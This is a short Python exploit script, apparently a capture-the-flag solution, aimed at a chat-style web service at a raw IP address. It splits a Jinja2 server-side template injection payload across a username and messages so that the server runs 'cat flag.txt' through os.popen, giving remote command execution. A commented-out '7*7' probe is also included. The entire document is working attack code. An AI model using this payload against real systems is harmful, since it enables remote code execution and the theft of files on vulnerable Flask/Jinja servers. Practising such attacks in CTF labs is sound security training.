import requests

url = "http://34.44.129.8:50366"
s = requests.Session()

def set_username(username):
    global s
    r = s.post(url + "/set_username", data={"username": username})
    return s

def send_message(message):
    global s
    r = s.post(url + "/send_message", data={"message": message})
    return r

# set_username("{{7*7 ~ '")
set_username("{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() ~ '")
send_message("haha")
set_username("' }}")
send_message("oooo")